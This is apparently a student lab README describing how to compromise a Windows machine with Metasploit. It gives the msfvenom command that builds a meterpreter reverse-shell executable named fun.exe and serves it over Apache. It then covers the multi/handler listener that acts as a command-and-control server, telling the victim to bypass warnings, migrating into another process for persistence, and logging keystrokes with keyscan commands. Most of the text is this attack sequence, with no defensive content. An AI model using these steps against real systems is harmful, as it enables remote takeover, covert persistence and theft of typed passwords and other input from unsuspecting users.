# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:
Find the attackers ip address using ifconfig

## OUTPUT:

![image](https://github.com/NAVEENKUMAR4325/Compromising-windows-using-Metasploit/assets/119479566/9109175c-dded-423b-843a-77b8081671b4)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:

![image](https://github.com/NAVEENKUMAR4325/Compromising-windows-using-Metasploit/assets/119479566/f8cf502d-6255-4087-ad82-00592a640443)

copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/NAVEENKUMAR4325/Compromising-windows-using-Metasploit/assets/119479566/e13ab1e0-aa46-4592-ba8a-6cbb83296174)

Start apache server sudo systemctl apache2 start

![image](https://github.com/NAVEENKUMAR4325/Compromising-windows-using-Metasploit/assets/119479566/f901b4a3-82d3-4fc1-80be-a1bdb17f49d5)

Check the status of apache2

![image](https://github.com/NAVEENKUMAR4325/Compromising-windows-using-Metasploit/assets/119479566/3017efd0-723a-456d-8a25-818fbf66059c)

## Invoke msfconsole:
## OUTPUT:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/NAVEENKUMAR4325/Compromising-windows-using-Metasploit/assets/119479566/950bdfab-e8ea-4034-912b-7ebd68e85922)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/NAVEENKUMAR4325/Compromising-windows-using-Metasploit/assets/119479566/0b5a10f0-aaf5-4c4d-9fd0-c455c540e10f)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/NAVEENKUMAR4325/Compromising-windows-using-Metasploit/assets/119479566/5266d231-54c8-42f0-be18-468c941009a7)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/NAVEENKUMAR4325/Compromising-windows-using-Metasploit/assets/119479566/0faef97e-d1c7-46a6-a147-da07b24fe96d)

keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/NAVEENKUMAR4325/Compromising-windows-using-Metasploit/assets/119479566/f143cc52-32c6-4d27-b953-6ae3c36fa83a)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
